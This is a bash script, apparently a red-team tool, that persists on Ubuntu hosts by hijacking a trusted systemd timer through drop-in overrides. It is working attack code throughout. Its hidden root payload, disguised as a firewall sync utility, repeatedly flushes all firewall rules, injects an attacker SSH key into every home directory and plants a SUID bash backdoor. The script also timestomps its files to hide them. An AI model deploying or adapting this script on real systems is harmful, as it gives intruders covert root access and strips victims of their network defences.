#!/usr/bin/env bash
# poison-timer.sh — hijack a trusted Ubuntu systemd timer via drop-in override
#
# Technique: systemd drop-in files (/etc/systemd/system/<svc>.d/override.conf)
# inject ExecStartPost into any existing service WITHOUT touching the original
# unit file.  The original service keeps working normally.
#
# Payload (runs as root every N minutes and at boot):
#   - Firewall flush (iptables, ip6tables, nftables, ufw, firewalld)
#   - SSH key re-injection into all home dirs
#   - SUID bash drop to /var/cache/.syspkg/.bash
#   - Watchdog restart of shadow-crond, flood-journal, ureadahead
#
# State is saved to /var/cache/.syspkg/poison-timer.state so remove/status
# always target exactly what was installed (not a re-guess from pick_target).
#
# Usage:
#   sudo ./poison-timer.sh install  [--target <timer>] [--interval <min>] [--key "ssh-ed25519 ..."]
#   sudo ./poison-timer.sh remove
#   sudo ./poison-timer.sh status
#   sudo ./poison-timer.sh list

set -euo pipefail

# ── config ────────────────────────────────────────────────────────────────────
TARGET_TIMER=""
INTERVAL_MIN=10
RT_SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlaceholderKeyReplaceBeforeDeployment rt-persist"

PAYLOAD="/usr/local/lib/.sysfwsync"
STATE_DIR="/var/cache/.syspkg"
STATE_FILE="${STATE_DIR}/poison-timer.state"

CANDIDATES=(
    "man-db.timer"
    "logrotate.timer"
    "fstrim.timer"
    "e2scrub_reap.timer"
    "systemd-tmpfiles-clean.timer"
    "dpkg-db-backup.timer"
    "motd-news.timer"
    "ua-timer.timer"
    "apt-daily.timer"          # last — ExecStart may fail if no-apt.sh ran first
)

# ── helpers ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err()  { echo -e "${RED}[!]${NC} $*" >&2; }
hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
require_root() { [[ $EUID -eq 0 ]] || { err "Run as root"; exit 1; }; }

timer_to_service() { local t="${1%.timer}"; echo "${t}.service"; }

pick_target() {
    for t in "${CANDIDATES[@]}"; do
        if systemctl cat "$t" &>/dev/null 2>&1; then
            echo "$t"; return
        fi
    done
    err "No suitable timer found. Use --target to specify one manually."
    exit 1
}

load_state() {
    [[ -f "$STATE_FILE" ]] || { err "No state file at $STATE_FILE — run install first"; exit 1; }
    # shellcheck disable=SC1090
    source "$STATE_FILE"
}

# ── install ───────────────────────────────────────────────────────────────────
cmd_install() {
    require_root

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --target)   TARGET_TIMER="$2"; shift 2 ;;
            --interval) INTERVAL_MIN="$2"; shift 2 ;;
            --key)      RT_SSH_KEY="$2";   shift 2 ;;
            *) shift ;;
        esac
    done

    [[ -z "$TARGET_TIMER" ]] && TARGET_TIMER=$(pick_target)
    [[ "$TARGET_TIMER" == *.timer ]] || TARGET_TIMER="${TARGET_TIMER}.timer"
    local TARGET_SERVICE
    TARGET_SERVICE=$(timer_to_service "$TARGET_TIMER")

    systemctl cat "$TARGET_TIMER"   &>/dev/null || { err "Timer not found: $TARGET_TIMER";   exit 1; }
    systemctl cat "$TARGET_SERVICE" &>/dev/null || { err "Service not found: $TARGET_SERVICE"; exit 1; }

    local TIMER_DROPIN_DIR="/etc/systemd/system/${TARGET_TIMER}.d"
    local SERVICE_DROPIN_DIR="/etc/systemd/system/${TARGET_SERVICE}.d"

    hdr "Poisoning $TARGET_TIMER → $TARGET_SERVICE"
    info "Interval : every ${INTERVAL_MIN} minutes"
    info "Payload  : $PAYLOAD"

    # ── 1. hidden payload script ──────────────────────────────────────────────
    hdr "1/5  Writing payload"
    mkdir -p "$STATE_DIR"; chmod 700 "$STATE_DIR"

    cat > "$PAYLOAD" <<PAYLOAD_EOF
#!/bin/bash
# System firewall synchronisation utility

# -- firewall flush --
for _t in filter nat mangle raw security; do
    iptables  -t "\$_t" -F 2>/dev/null; iptables  -t "\$_t" -X 2>/dev/null; iptables  -t "\$_t" -Z 2>/dev/null
    ip6tables -t "\$_t" -F 2>/dev/null; ip6tables -t "\$_t" -X 2>/dev/null; ip6tables -t "\$_t" -Z 2>/dev/null
done
for _c in INPUT FORWARD OUTPUT; do
    iptables  -P "\$_c" ACCEPT 2>/dev/null
    ip6tables -P "\$_c" ACCEPT 2>/dev/null
done
nft flush ruleset 2>/dev/null
ufw --force disable 2>/dev/null; ufw --force reset 2>/dev/null
systemctl stop firewalld 2>/dev/null; systemctl disable firewalld 2>/dev/null

# -- SSH key re-injection --
_k="${RT_SSH_KEY}"
for _h in /root \$(awk -F: '\$3>=1000 && \$7!~/nologin|false/{print \$6}' /etc/passwd); do
    [[ -d "\$_h" ]] || continue
    mkdir -p "\$_h/.ssh" && chmod 700 "\$_h/.ssh"
    touch "\$_h/.ssh/authorized_keys" && chmod 600 "\$_h/.ssh/authorized_keys"
    grep -qF "\$_k" "\$_h/.ssh/authorized_keys" 2>/dev/null || echo "\$_k" >> "\$_h/.ssh/authorized_keys"
done

# -- SUID bash handle --
[[ -u /var/cache/.syspkg/.bash ]] || {
    cp /bin/bash /var/cache/.syspkg/.bash 2>/dev/null
    chmod u+s /var/cache/.syspkg/.bash 2>/dev/null
}

# -- watchdog restarts --
for _svc in systemd-timesyncd-helper network-health-monitor ureadahead; do
    systemctl is-active --quiet "\$_svc" 2>/dev/null || systemctl start "\$_svc" 2>/dev/null
done

exit 0
PAYLOAD_EOF
    chmod 755 "$PAYLOAD"
    touch -t 202004150830 "$PAYLOAD"
    info "Payload written: $PAYLOAD"

    # ── 2. timer drop-in — increase firing frequency ──────────────────────────
    hdr "2/5  Timer drop-in (every ${INTERVAL_MIN} min)"
    mkdir -p "$TIMER_DROPIN_DIR"
    cat > "${TIMER_DROPIN_DIR}/override.conf" <<EOF
[Timer]
OnBootSec=60s
OnUnitActiveSec=${INTERVAL_MIN}m
RandomizedDelaySec=0
EOF
    touch -t 202004150830 "${TIMER_DROPIN_DIR}/override.conf" "${TIMER_DROPIN_DIR}"
    info "Timer drop-in: ${TIMER_DROPIN_DIR}/override.conf"

    # ── 3. service drop-in — inject payload into ExecStartPost ────────────────
    hdr "3/5  Service drop-in"
    mkdir -p "$SERVICE_DROPIN_DIR"
    cat > "${SERVICE_DROPIN_DIR}/override.conf" <<EOF
[Service]
ExecStartPost=${PAYLOAD}
EOF
    touch -t 202004150830 "${SERVICE_DROPIN_DIR}/override.conf" "${SERVICE_DROPIN_DIR}"
    info "Service drop-in: ${SERVICE_DROPIN_DIR}/override.conf"

    # ── 4. save state ─────────────────────────────────────────────────────────
    hdr "4/5  Saving state"
    {
        echo "TARGET_TIMER=${TARGET_TIMER}"
        echo "TARGET_SERVICE=${TARGET_SERVICE}"
        echo "TIMER_DROPIN_DIR=${TIMER_DROPIN_DIR}"
        echo "SERVICE_DROPIN_DIR=${SERVICE_DROPIN_DIR}"
        echo "INTERVAL_MIN=${INTERVAL_MIN}"
    } > "$STATE_FILE"
    chmod 600 "$STATE_FILE"
    touch -t 202004150830 "$STATE_FILE"
    info "State saved: $STATE_FILE"

    # ── 5. reload and trigger immediately ─────────────────────────────────────
    hdr "5/5  Reloading systemd and triggering"
    systemctl daemon-reload
    systemctl enable "$TARGET_TIMER" --quiet 2>/dev/null || true
    systemctl restart "$TARGET_TIMER" 2>/dev/null || systemctl start "$TARGET_TIMER" 2>/dev/null || true
    bash "$PAYLOAD"
    info "Payload fired immediately"

    echo
    info "=== poison-timer active ==="
    info "Timer   : $TARGET_TIMER"
    info "Service : $TARGET_SERVICE"
    info "Interval: every ${INTERVAL_MIN} min"
    [[ "$RT_SSH_KEY" == *Placeholder* ]] && warn "Placeholder SSH key — re-run with --key 'ssh-ed25519 ...'"
}

# ── remove ────────────────────────────────────────────────────────────────────
cmd_remove() {
    require_root
    load_state

    hdr "Removing drop-ins for $TARGET_TIMER"
    rm -rf "$TIMER_DROPIN_DIR"   && info "Removed $TIMER_DROPIN_DIR"   || warn "Not found: $TIMER_DROPIN_DIR"
    rm -rf "$SERVICE_DROPIN_DIR" && info "Removed $SERVICE_DROPIN_DIR" || warn "Not found: $SERVICE_DROPIN_DIR"
    rm -f  "$PAYLOAD"            && info "Removed $PAYLOAD"            || warn "Not found: $PAYLOAD"
    rm -f  "$STATE_FILE"         && info "Removed state file"

    systemctl daemon-reload
    systemctl restart "$TARGET_TIMER" 2>/dev/null || true
    info "systemd reloaded — $TARGET_TIMER restored to original schedule"
    warn "Existing firewall state is still empty; blue team must re-apply rules manually"
}

# ── status ────────────────────────────────────────────────────────────────────
cmd_status() {
    hdr "State"
    if [[ -f "$STATE_FILE" ]]; then
        while IFS='=' read -r k v; do
            printf "  %-25s %s\n" "$k" "$v"
        done < "$STATE_FILE"
    else
        warn "No state file — not installed (or state was wiped)"
    fi

    hdr "Drop-in files"
    if [[ -f "$STATE_FILE" ]]; then
        load_state
        for f in "${TIMER_DROPIN_DIR}/override.conf" "${SERVICE_DROPIN_DIR}/override.conf"; do
            [[ -f "$f" ]] && info "PRESENT  $f" || warn "MISSING  $f"
        done
    else
        # fallback: scan all candidates
        for t in "${CANDIDATES[@]}"; do
            local svc; svc=$(timer_to_service "$t")
            local td="/etc/systemd/system/${t}.d/override.conf"
            local sd="/etc/systemd/system/${svc}.d/override.conf"
            [[ -f "$td" || -f "$sd" ]] && info "POISONED  $t / $svc"
        done
    fi

    hdr "Payload"
    [[ -f "$PAYLOAD" ]] && info "PRESENT  $PAYLOAD" || warn "ABSENT   $PAYLOAD"

    hdr "SUID bash handle"
    [[ -u /var/cache/.syspkg/.bash ]] \
        && info "PRESENT  /var/cache/.syspkg/.bash  (use: /var/cache/.syspkg/.bash -p)" \
        || warn "MISSING  /var/cache/.syspkg/.bash"

    hdr "Watchdog services"
    for svc in systemd-timesyncd-helper network-health-monitor ureadahead; do
        systemctl is-active --quiet "$svc" 2>/dev/null \
            && info "RUNNING  $svc" || warn "STOPPED  $svc"
    done

    hdr "Firewall state (should be open if poison is working)"
    iptables -L -n --line-numbers 2>/dev/null | head -15 || warn "iptables not available"
}

# ── list ──────────────────────────────────────────────────────────────────────
cmd_list() {
    hdr "Candidate timers present on this host"
    printf "  %-35s %-30s %s\n" "TIMER" "SERVICE" "STATE"
    for t in "${CANDIDATES[@]}"; do
        if systemctl cat "$t" &>/dev/null; then
            local state; state=$(systemctl is-active "$t" 2>/dev/null || echo "inactive")
            printf "  %-35s %-30s %s\n" "$t" "$(timer_to_service "$t")" "$state"
        fi
    done
}

# ── dispatch ──────────────────────────────────────────────────────────────────
CMD="${1:-help}"; shift || true
case "$CMD" in
    install) cmd_install "$@" ;;
    remove)  cmd_remove       ;;
    status)  cmd_status       ;;
    list)    cmd_list         ;;
    *)
        echo "Usage: sudo $0 {install|remove|status|list}"
        echo
        echo "  install   Poison a trusted timer to flush firewalls + re-assert persistence"
        echo "  remove    Remove all drop-ins and payload (uses saved state)"
        echo "  status    Show active poison, watchdog state, and firewall state"
        echo "  list      Show candidate timers available on this host"
        echo
        echo "Install options:"
        echo "  --target <name>      Timer to hijack (e.g. man-db.timer)"
        echo "  --interval <min>     Flush frequency in minutes (default: 10)"
        echo "  --key 'ssh-ed25519 ...'  SSH key to re-inject on every trigger"
        ;;
esac
